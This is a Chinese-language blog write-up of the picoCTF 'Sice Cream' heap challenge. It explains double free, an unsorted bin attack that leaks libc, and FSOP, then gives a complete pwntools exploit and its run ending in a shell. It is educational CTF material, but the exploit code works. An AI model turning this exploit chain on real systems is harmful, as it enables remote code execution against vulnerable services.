---
layout: post
title: picoCTF - Sice Cream 
category: PWN
published: true
---

[sice_cream 题目链接](https://play.picoctf.org/practice/challenge/55?category=6&page=1)

刚开始做到一半就没啥思路了，在看到并理解了[how2heap - house_of_orange](../how2heap_house_of_orange)之后就回过头来把这题做了。主要用到的技术：DoubleFree + unsorted bin attack + FSOP。

大致介绍下程序，选项1是malloc你指定的大小，可以malloc多个，选项2可以选择性的free你之前malloc的内存。有一个全局变量USER_NAME，选项3重命名并输出它。

```bash
clot@ubuntu:~/CTF/sice_cream$ ./sice_cream
Welcome to the Sice Cream Store!
We have the best sice cream in the world!
Whats your name?
> a
1. Buy sice cream
2. Eat sice cream
3. Reintroduce yourself
4. Exit
> 
```

### 思路

1. 通过double free来将name的地址插入fast bin
2. 更改name的大小，再释放，使其放回unsorted bin
3. 改写name的bk指针，通过unsorted bin attack更改name->bk->fd指向unsorted bin，leak libc地址
4. 改写name来伪造FILE结构体，最后malloc触发崩溃并触发IO缓冲刷新，实际调用system函数。

### double free

通过在一开始输入名字时，将大小0x21写在name+8的位置，这步是为了绕过之后fast bin对size的检查。

之后就是double free的标准流程，最后一次buy操作返回的chunk实际是name的地址

```py
# name - fake chunk size: 0x21, bypass fastbin check
p.sendlineafter('>', p64(0) + p64(0x21) * 26)

# double free
buy(20, 'A'*8) # 0
buy(20, 'B'*8) # 1
eat(0)
eat(1)
eat(0)

# set fd pointer -> &USER_NAME
buy(20, p64(nameAddr)) # 2
buy(20, 'C'*8) # 3
buy(20, 'D'*8) # 4

# ret fake chunk from fast bin
buy(20, 'E'*8) # 5
```

### 插入unsorted bin

这一步通过reintroduce的功能，改写name chunk的size字段，大于`MAX_FAST_SIZE`即可，在64位上最大是0x88，所以这里设置为`0x90 | previnuse 1`。然后通过eat来将其放到unsorted bin中，此时name + 0x10指向的是unsorted bin也就是libc中的地址。

```py
reintroduce(p64(0) + p64(0x91))
eat(5)
```

### leak libc

通过reintroduce来改写字符串并leak libc的地址，再通过`system`和`_IO_list_all`函数的偏移来计算出它们各自的实际地址。

```py
# leak libc: unsorted bin address
reintroduce('A'*15)
p.recvline()
addrStr = p.recvline()[:-2]
leakAddr = u64(addrStr.ljust(8, b"\x00"))
log.info("leakAddr: {}".format(hex(leakAddr)))

# system address
systemAddr = leakAddr - unsortedBinOffset + systemOffset

# _IO_list_all
IOListAllAddr = leakAddr + 0x9a8
log.info("IO_list_all: {}".format(hex(IOListAllAddr)))
```

### unsorted bin attack + FSOP

```c
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);
```

如果要使指针A的值指向unsorted bin，则需要将其-0x10后放置到chunk->bk的位置，这样fake chunk的fd也就是A就会指向unsorted bin。

同时需要在name这块内存中伪造一个FILE结构体。上一篇[house_of_orange的分析](../how2heap_house_of_orange)中对FSOP已经有较详细的介绍，这里大概说明下：在程序退出时会触发一个刷新IO的机制，此时会遍历`IO_list_all`的chain指针，假设当前遍历到了`_IO_FILE_plus A`，则会调用A的vtable中的`_IO_overflow(fp, EOF)`函数刷新IO，我们的目的也就是替换掉`_IO_overflow`这个函数以及它的fp参数。同时要绕过在执行该函数前对`(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)`的检查。

通过计算结构体中vtable以及_mode等字段的偏移，来设置我们的payload。但此时该结构体还未插入`_IO_list_all`的chain(fp + 0x68)字段中，由于此时`_IO_list_all`指向的是unsorted bin，所以我们需要将伪造的结构体插入到unosorted bin + 0x68即smallbin[4](90 ~ 98)的位置。

所以我们通过改写fake chunk的大小为0x61，使下次malloc时，将unsorted bin中的chunk放到对应的bin中，也就是smallbin[4]的位置。

```py
# unsorted bin attack + FSOP
payload = sh + p64(0x61) + p64(leakAddr) + p64(IOListAllAddr - 0x10)
payload += p64(2) + p64(3) + p64(systemAddr) * 0x12 + p64(0) * 3 + p64(nameAddr + 0x30)

reintroduce(payload)
```

### 获得shell

最后只需再触发一次malloc，在malloc检查的过程中会发现`IO_list_all`指向的堆块已损坏便crash了。此时刷新IO，即调用`system("/bin/sh")`

```py
# trigger malloc then get the shell after crash 
p.sendlineafter('>','1')
p.sendlineafter('>', '50')

p.interactive()
```

### 完整的exploit

```py
from pwn import *

libc = ELF("libc.so.6")
elf = ELF("sice_cream")

REMOTE = 1

if REMOTE:
    host = 'jupiter.challenges.picoctf.org'
    port = '51890'
    p = remote(host, port)
else:
    p = elf.process()
    gdb.attach(p)

unsortedBinOffset = 0x3c4b87 # __malloc_hook + 0x10(main_arena) + 88
IOListAllOffset = 0x3c5520
systemOffset = 0x45390
nameAddr = 0x602040
sh = b"/bin/sh;"

# menu 
def buy(size, content):
    p.sendlineafter('>', '1')
    p.sendlineafter('>', str(size))
    p.sendlineafter('>', content)

def eat(index):
    p.sendlineafter('>', '2')
    p.sendlineafter('>', str(index))

def reintroduce(name):
    p.sendlineafter('>', '3')
    p.sendlineafter('>', name)

# name - fake chunk size: 0x21, bypass fastbin check
p.sendlineafter('>', p64(0) + p64(0x21) * 26)

# double free
buy(20, 'A'*8) # 0
buy(20, 'B'*8) # 1
eat(0)
eat(1)
eat(0)

# set fd pointer -> &USER_NAME
buy(20, p64(nameAddr)) # 2
buy(20, 'C'*8) # 3
buy(20, 'D'*8) # 4

# ret fake chunk from fast bin
buy(20, 'E'*8) # 5

# the size must be greater than 0x88 to insert to unsorted bin after eat.
reintroduce(p64(0) + p64(0x91))
eat(5)

# leak libc: unsorted bin address
reintroduce('A'*15)
p.recvline()
addrStr = p.recvline()[:-2]
leakAddr = u64(addrStr.ljust(8, b"\x00"))
log.info("leakAddr: {}".format(hex(leakAddr)))

# system address
systemAddr = leakAddr - unsortedBinOffset + systemOffset

# _IO_list_all
IOListAllAddr = leakAddr + 0x9a8
log.info("IO_list_all: {}".format(hex(IOListAllAddr)))

# unsorted bin attack + FSOP
payload = sh + p64(0x61) + p64(leakAddr) + p64(IOListAllAddr - 0x10)
payload += p64(2) + p64(3) + p64(systemAddr) * 0x12 + p64(0) * 3 + p64(nameAddr + 0x30)

reintroduce(payload)

# trigger malloc then get the shell after crash 
p.sendlineafter('>','1')
p.sendlineafter('>', '50')

p.interactive()
```

### 执行结果

```bash
clot@ubuntu:~/CTF/sice_cream$ python3 sice_cream.py 
[*] '/home/clot/CTF/sice_cream/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/clot/CTF/sice_cream/sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
[+] Opening connection to jupiter.challenges.picoctf.org on port 51860: Done
[*] leakAddr: 0x7fd4ff71fb78
[*] IO_list_all: 0x7fd4ff720520
[*] Switching to interactive mode
 *** Error in `/problems/sice-cream_2_fba6d241362269d610df62c069a9828f/sice_cream': malloc(): memory corruption: 0x00007fd4ff720520 ***
======= Backtrace: =========
./libc.so.6(+0x777e5)[0x7fd4ff3d27e5]
./libc.so.6(+0x8213e)[0x7fd4ff3dd13e]
./libc.so.6(__libc_malloc+0x54)[0x7fd4ff3df184]
/problems/sice-cream_2_fba6d241362269d610df62c069a9828f/sice_cream[0x4009d8]
/problems/sice-cream_2_fba6d241362269d610df62c069a9828f/sice_cream[0x400c8f]
./libc.so.6(__libc_start_main+0xf0)[0x7fd4ff37b830]
/problems/sice-cream_2_fba6d241362269d610df62c069a9828f/sice_cream[0x4007ea]
======= Memory map: ========
00400000-00402000 r-xp 00000000 103:01 2560377                           /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/sice_cream
00601000-00602000 r--p 00001000 103:01 2560377                           /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/sice_cream
00602000-00603000 rw-p 00002000 103:01 2560377                           /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/sice_cream
018cb000-018ec000 rw-p 00000000 00:00 0                                  [heap]
7fd4f8000000-7fd4f8021000 rw-p 00000000 00:00 0 
7fd4f8021000-7fd4fc000000 ---p 00000000 00:00 0 
7fd4ff143000-7fd4ff15a000 r-xp 00000000 103:01 2054                      /lib/x86_64-linux-gnu/libgcc_s.so.1
7fd4ff15a000-7fd4ff359000 ---p 00017000 103:01 2054                      /lib/x86_64-linux-gnu/libgcc_s.so.1
7fd4ff359000-7fd4ff35a000 r--p 00016000 103:01 2054                      /lib/x86_64-linux-gnu/libgcc_s.so.1
7fd4ff35a000-7fd4ff35b000 rw-p 00017000 103:01 2054                      /lib/x86_64-linux-gnu/libgcc_s.so.1
7fd4ff35b000-7fd4ff51b000 r-xp 00000000 103:01 2560378                   /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/libc.so.6
7fd4ff51b000-7fd4ff71b000 ---p 001c0000 103:01 2560378                   /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/libc.so.6
7fd4ff71b000-7fd4ff71f000 r--p 001c0000 103:01 2560378                   /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/libc.so.6
7fd4ff71f000-7fd4ff721000 rw-p 001c4000 103:01 2560378                   /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/libc.so.6
7fd4ff721000-7fd4ff725000 rw-p 00000000 00:00 0 
7fd4ff725000-7fd4ff74b000 r-xp 00000000 103:01 2560379                   /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/ld-2.23.so
7fd4ff946000-7fd4ff94a000 rw-p 00000000 00:00 0 
7fd4ff94a000-7fd4ff94b000 r--p 00025000 103:01 2560379                   /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/ld-2.23.so
7fd4ff94b000-7fd4ff94c000 rw-p 00026000 103:01 2560379                   /problems/sice-cream_2_fba6d241362269d610df62c069a9828f/ld-2.23.so
7fd4ff94c000-7fd4ff94d000 rw-p 00000000 00:00 0 
7ffef58fd000-7ffef591e000 rw-p 00000000 00:00 0                          [stack]
7ffef593d000-7ffef5940000 r--p 00000000 00:00 0                          [vvar]
7ffef5940000-7ffef5941000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
$ ls
flag.txt
ld-2.23.so
libc.so.6
sice_cream
xinet_startup.sh
```
